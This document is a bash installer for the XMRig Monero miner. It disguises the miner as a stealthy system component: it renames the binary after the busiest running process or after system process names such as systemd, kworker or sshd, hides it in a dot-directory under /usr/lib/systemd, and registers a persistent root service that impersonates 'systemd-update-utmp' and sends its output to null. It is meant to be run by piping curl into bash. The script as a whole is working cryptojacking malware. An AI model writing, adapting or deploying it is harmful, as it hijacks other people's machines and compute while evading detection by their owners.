#!/bin/bash

# XMR Mining Script (English Version)
# Compatible with mainstream Linux distributions and CPU architectures
# Usage: curl -s -L your-domain.com/miner_en.sh | LC_ALL=en_US.UTF-8 bash -s wallet_address pool_address:port

set -e

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Parameter validation
if [ $# -lt 2 ]; then
    log_error "Insufficient parameters!"
    echo "Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s wallet_address pool_address:port [CPU_usage%]"
    echo "Example: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
    echo "CPU usage parameter is optional, defaults to using all CPU cores, setting 50 means using 50% of CPU cores"
    exit 1
fi

# Parameter parsing
WALLET_ADDRESS="$1"
POOL_ADDRESS="$2"
CPU_USAGE="${3:-100}"  # Default 100% using all cores

# Validate CPU usage parameter
if ! [[ "$CPU_USAGE" =~ ^[0-9]+$ ]] || [ "$CPU_USAGE" -lt 1 ] || [ "$CPU_USAGE" -gt 100 ]; then
    log_error "Invalid CPU usage parameter! Please enter a number between 1-100"
    exit 1
fi

# Validate parameters
if [ -z "$WALLET_ADDRESS" ] || [ -z "$POOL_ADDRESS" ]; then
    log_error "All parameters are required"
    exit 1
fi

# Set environment variables
export HOME=/root
export LC_ALL=en_US.UTF-8

log_info "Starting XMR mining script installation..."
log_info "Wallet Address: $WALLET_ADDRESS"
log_info "Pool Address: $POOL_ADDRESS"
log_info "CPU Usage: ${CPU_USAGE}%"

# Detect CPU cores and calculate binding
detect_cpu_info() {
    log_info "Detecting CPU information..."
    
    # Get CPU core count
    if command -v lscpu >/dev/null 2>&1; then
        TOTAL_CORES=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
    elif [ -f /proc/cpuinfo ]; then
        TOTAL_CORES=$(grep -c "^processor" /proc/cpuinfo)
    else
        log_warn "Unable to detect CPU core count, using default value 4"
        TOTAL_CORES=4
    fi
    
    # Validate core count
    if ! [[ "$TOTAL_CORES" =~ ^[0-9]+$ ]] || [ "$TOTAL_CORES" -lt 1 ]; then
        log_warn "CPU core count detection abnormal, using default value 4"
        TOTAL_CORES=4
    fi
    
    # Calculate cores to use
    USED_CORES=$(( (TOTAL_CORES * CPU_USAGE + 99) / 100 ))  # Round up
    
    # Ensure at least 1 core is used
    if [ "$USED_CORES" -lt 1 ]; then
        USED_CORES=1
    fi
    
    # Ensure not exceeding total cores
    if [ "$USED_CORES" -gt "$TOTAL_CORES" ]; then
        USED_CORES=$TOTAL_CORES
    fi
    
    log_info "Total CPU cores: $TOTAL_CORES"
    log_info "Cores to use: $USED_CORES (${CPU_USAGE}%)"
    
    # Generate CPU affinity list (0 to USED_CORES-1)
    CPU_AFFINITY=""
    for ((i=0; i<USED_CORES; i++)); do
        if [ -z "$CPU_AFFINITY" ]; then
            CPU_AFFINITY="$i"
        else
            CPU_AFFINITY="$CPU_AFFINITY,$i"
        fi
    done
    
    log_info "CPU affinity list: $CPU_AFFINITY"
}

# System detection
detect_system() {
    log_info "Detecting system information..."
    
    # Detect OS
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        OS_VERSION=$VERSION_ID
    else
        log_error "Cannot detect operating system"
        exit 1
    fi
    
    # Detect architecture
    ARCH=$(uname -m)
    case $ARCH in
        x86_64)
            XMRIG_ARCH="x64"
            ;;
        aarch64|arm64)
            log_error "ARM64 architecture is not supported by XMRig for Linux systems"
            log_error "Please use an x64 system to run XMRig"
            exit 1
            ;;
        *)
            log_error "Unsupported architecture: $ARCH"
            exit 1
            ;;
    esac
    
    log_info "Operating System: $OS"
    log_info "Architecture: $ARCH -> $XMRIG_ARCH"
}

# Set XMRig version
set_version() {
    log_info "Setting XMRig version..."
    VERSION="6.24.0"
    log_info "XMRig version: $VERSION"
}

# Get download URL
get_download_url() {
    log_info "Generating download URL..."
    
    # Determine the appropriate download URL based on OS and architecture
    case $OS in
        ubuntu|debian)
            if [ "$OS_VERSION" = "20.04" ] || [ "$OS_VERSION" = "20" ]; then
                DISTRO="focal"
            elif [ "$OS_VERSION" = "22.04" ] || [ "$OS_VERSION" = "22" ]; then
                DISTRO="jammy"
            elif [ "$OS_VERSION" = "24.04" ] || [ "$OS_VERSION" = "24" ]; then
                DISTRO="noble"
            else
                DISTRO="focal"  # Default fallback
            fi
            ;;
        centos|rhel|rocky|almalinux)
            DISTRO="linux-static"  # Use static build for RHEL-based
            ;;
        freebsd)
            DISTRO="freebsd-static"
            ;;
        *)
            DISTRO="linux-static"  # Default to static build
            ;;
    esac
    
    # Handle macOS separately
    if [[ "$OSTYPE" == "darwin"* ]]; then
        if [ "$XMRIG_ARCH" = "arm64" ]; then
            FILENAME="xmrig-${VERSION}-macos-arm64.tar.gz"
        else
            FILENAME="xmrig-${VERSION}-macos-x64.tar.gz"
        fi
    else
        # Linux and other Unix-like systems
        # Note: XMRig doesn't provide ARM64 builds for Linux, use x64 static build for all architectures
        FILENAME="xmrig-${VERSION}-${DISTRO}-x64.tar.gz"
    fi
    
    DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${FILENAME}"
    
    log_info "Download URL: $DOWNLOAD_URL"
}

# Check prerequisites
check_prerequisites() {
    log_info "Checking prerequisites..."
    
    # Check required commands
    local missing_commands=""
    
    if ! command -v curl >/dev/null 2>&1; then
        missing_commands="$missing_commands curl"
    fi
    
    if ! command -v wget >/dev/null 2>&1; then
        missing_commands="$missing_commands wget"
    fi
    
    if ! command -v tar >/dev/null 2>&1; then
        missing_commands="$missing_commands tar"
    fi
    
    if [ -n "$missing_commands" ]; then
        log_warn "Missing required commands:$missing_commands"
        log_info "Attempting to install missing dependencies..."
        install_missing_dependencies
        
        # Re-check after installation
        for cmd in $missing_commands; do
            if ! command -v $cmd >/dev/null 2>&1; then
                log_error "Failed to install $cmd. Please install it manually and run the script again."
                exit 1
            fi
        done
        log_info "All required dependencies are now available."
    else
        log_info "All required dependencies are available."
    fi
}

# Install missing dependencies
install_missing_dependencies() {
    if command -v apt-get >/dev/null 2>&1; then
        # Debian/Ubuntu - use simple approach like C3Pool
        log_info "Updating package list..."
        if ! apt-get update -qq; then
            log_warn "Package update failed, but continuing..."
        fi
        
        log_info "Installing missing packages..."
        apt-get install -y wget curl tar || {
            log_error "Failed to install packages. Please run: sudo apt-get install wget curl tar"
            exit 1
        }
        
    elif command -v yum >/dev/null 2>&1; then
        # CentOS/RHEL 7
        yum install -y wget curl tar || {
            log_error "Failed to install packages. Please run: sudo yum install wget curl tar"
            exit 1
        }
    elif command -v dnf >/dev/null 2>&1; then
        # CentOS/RHEL 8+/Fedora
        dnf install -y wget curl tar || {
            log_error "Failed to install packages. Please run: sudo dnf install wget curl tar"
            exit 1
        }
    elif command -v zypper >/dev/null 2>&1; then
        # openSUSE
        zypper install -y wget curl tar || {
            log_error "Failed to install packages. Please run: sudo zypper install wget curl tar"
            exit 1
        }
    elif command -v pacman >/dev/null 2>&1; then
        # Arch Linux
        pacman -Sy --noconfirm wget curl tar || {
            log_error "Failed to install packages. Please run: sudo pacman -S wget curl tar"
            exit 1
        }
    elif command -v apk >/dev/null 2>&1; then
        # Alpine Linux
        apk add --no-cache wget curl tar || {
            log_error "Failed to install packages. Please run: sudo apk add wget curl tar"
            exit 1
        }
    else
        log_error "Cannot identify package manager. Please install wget, curl, tar manually and run the script again."
        exit 1
    fi
}

# Get process name for disguise
get_disguise_name() {
    log_info "Getting process name for disguise..."
    
    # Get the process with highest CPU usage (excluding kernel processes)
    DISGUISE_NAME=$(ps aux --no-headers | grep -v '\[' | sort -k3 -nr | head -1 | awk '{print $11}' | sed 's/.*\///')
    
    # Fallback to common system processes if no suitable process found
    if [ -z "$DISGUISE_NAME" ] || [ "$DISGUISE_NAME" = "ps" ] || [ "$DISGUISE_NAME" = "sort" ]; then
        DISGUISE_NAMES=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "rcu_par_gp" "kworker" "mm_percpu_wq" "ksoftirqd" "watchdog" "sshd" "NetworkManager" "systemd-logind")
        DISGUISE_NAME=${DISGUISE_NAMES[$RANDOM % ${#DISGUISE_NAMES[@]}]}
    fi
    
    log_info "Using disguise name: $DISGUISE_NAME"
}

# Create hidden directory structure
create_hidden_dirs() {
    log_info "Creating hidden directory structure..."
    
    # Create deep hidden directory structure
    HIDDEN_BASE="/usr/lib/systemd/system-generators/.cache"
    WORK_DIR="$HIDDEN_BASE/systemd-update-utmp"
    
    mkdir -p "$WORK_DIR"
    
    # Set directory permissions to blend in
    chmod 755 "$HIDDEN_BASE"
    chmod 755 "$WORK_DIR"
    
    log_info "Hidden directory created: $WORK_DIR"
}

# Download and install XMRig
download_and_install() {
    log_info "Downloading and installing XMRig..."
    
    # Create hidden directory structure
    create_hidden_dirs
    cd "$WORK_DIR"
    
    # Download file
    log_info "Downloading $FILENAME ..."
    wget -q --show-progress "$DOWNLOAD_URL" -O "$FILENAME" || {
        log_error "Download failed"
        exit 1
    }
    
    # Extract file
    log_info "Extracting file..."
    tar -xzf "$FILENAME" --strip-components=1 || {
        log_error "Extraction failed"
        exit 1
    }
    
    # Clean up download file
    rm -f "$FILENAME"
    
    # Delete official config file (if exists)
    if [ -f "$WORK_DIR/config.json" ]; then
        log_info "Removing official default config file..."
        rm -f "$WORK_DIR/config.json"
    fi
    
    # Get disguise name before renaming
    get_disguise_name
    
    # Rename xmrig to disguise name
    mv xmrig "$DISGUISE_NAME"
    
    # Set execute permissions
    chmod +x "$DISGUISE_NAME"
    
    # Create symlink with original name for compatibility
    ln -sf "$DISGUISE_NAME" xmrig
    
    log_info "XMRig installation completed with disguise name: $DISGUISE_NAME"
}

# Create configuration file
create_config() {
    log_info "Creating configuration file..."
    
    # If official config file exists, remove it completely
    if [ -f "$WORK_DIR/config.json" ]; then
        log_info "Detected official config file, will completely overwrite..."
        rm -f "$WORK_DIR/config.json"
    fi
    
    cat > "$WORK_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $USED_CORES,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "affinity": [$CPU_AFFINITY]
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$POOL_ADDRESS",
            "user": "$WALLET_ADDRESS",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ip_version": 0,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
    
    log_info "Configuration file created successfully"
}

# Create systemd service
create_systemd_service() {
    log_info "Creating systemd service..."
    
    # Create service with disguised name
    SERVICE_NAME="systemd-update-utmp"
    
    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=Update UTMP about System Runlevel Changes
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$WORK_DIR
ExecStart=$WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=$DISGUISE_NAME

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable ${SERVICE_NAME}.service
    
    log_info "Systemd service created and enabled"
}

# Create SysV init script
create_sysv_service() {
    log_info "Creating SysV init script..."
    
    SERVICE_NAME="systemd-update-utmp"
    
    cat > /etc/init.d/$SERVICE_NAME << EOF
#!/bin/bash
# $SERVICE_NAME        Update UTMP about System Runlevel Changes
# chkconfig: 35 99 99
# description: Update UTMP about System Runlevel Changes
#

. /etc/rc.d/init.d/functions

USER="root"
DAEMON="$DISGUISE_NAME"
ROOT_DIR="$WORK_DIR"

SERVER="\$ROOT_DIR/\$DAEMON"
LOCK_FILE="/var/lock/subsys/$SERVICE_NAME"

do_start() {
    if [ -f \$LOCK_FILE ] ; then
        echo "\$DAEMON is locked."
        return 1
    fi
    
    echo -n "Starting \$DAEMON: "
    runuser -l "\$USER" -c "\$SERVER --config=\$ROOT_DIR/config.json" && echo_success || echo_failure
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && touch \$LOCK_FILE
    return \$RETVAL
}
do_stop() {
    echo -n "Shutting down \$DAEMON: "
    pid=\$(ps -aefw | grep "\$DAEMON" | grep -v " grep " | awk '{print \$2}')
    kill -9 \$pid > /dev/null 2>&1
    # Also kill any xmrig processes
    pkill -f "xmrig" > /dev/null 2>&1
    [ \$? -eq 0 ] && echo_success || echo_failure
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && rm -f \$LOCK_FILE
    return \$RETVAL
}

case "\$1" in
    start)
        do_start
        ;;
    stop)
        do_stop
        ;;
    restart)
        do_stop
        do_start
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        RETVAL=1
esac

exit \$RETVAL
EOF
    
    chmod +x /etc/init.d/$SERVICE_NAME
    chkconfig --add $SERVICE_NAME
    chkconfig $SERVICE_NAME on
    
    log_info "SysV init script created and enabled"
}

# Setup auto-start
setup_autostart() {
    log_info "Setting up auto-start..."
    
    if command -v systemctl >/dev/null 2>&1; then
        create_systemd_service
    else
        create_sysv_service
    fi
    
    log_info "Auto-start configuration completed"
}

# Start mining
start_mining() {
    log_info "Starting mining service..."
    
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start ${SERVICE_NAME}.service
        systemctl status ${SERVICE_NAME}.service --no-pager
    else
        service $SERVICE_NAME start
    fi
    
    log_info "Mining service started"
}

# Show status information
show_status() {
    echo
    log_info "=== Installation Complete ==="
    log_info "XMRig Version: $VERSION"
    log_info "Installation Directory: $WORK_DIR"
    log_info "Wallet Address: $WALLET_ADDRESS"
    log_info "Pool Address: $POOL_ADDRESS"
    log_info "Donation Setting: 0%"
    log_info "Process Name: $DISGUISE_NAME"
    log_info "Service Name: $SERVICE_NAME"
    echo
    log_info "=== Management Commands ==="
    if command -v systemctl >/dev/null 2>&1; then
        log_info "Check Status: systemctl status $SERVICE_NAME"
        log_info "Stop Mining: systemctl stop $SERVICE_NAME"
        log_info "Start Mining: systemctl start $SERVICE_NAME"
        log_info "Restart Mining: systemctl restart $SERVICE_NAME"
        log_info "View Logs: journalctl -u $SERVICE_NAME -f"
    else
        log_info "Check Status: service $SERVICE_NAME status"
        log_info "Stop Mining: service $SERVICE_NAME stop"
        log_info "Start Mining: service $SERVICE_NAME start"
        log_info "Restart Mining: service $SERVICE_NAME restart"
    fi
    echo
    log_info "Config File: $WORK_DIR/config.json"
    log_info "Manual Run: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
}

# Main function
main() {
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        log_error "Please run this script with root privileges"
        exit 1
    fi
    
    # Get disguise name first
    DISGUISE_NAME=$(get_disguise_name)
    SERVICE_NAME="systemd-update-utmp"
    
    log_info "Process will be disguised as: $DISGUISE_NAME"
    log_info "Service will be named: $SERVICE_NAME"
    
    # Execute installation steps
    detect_cpu_info
    detect_system
    set_version
    get_download_url
    check_prerequisites
    download_and_install
    create_config
    setup_autostart
    start_mining
    show_status
    
    log_info "XMR mining script installation completed!"
}

# Run main function
main "$@"
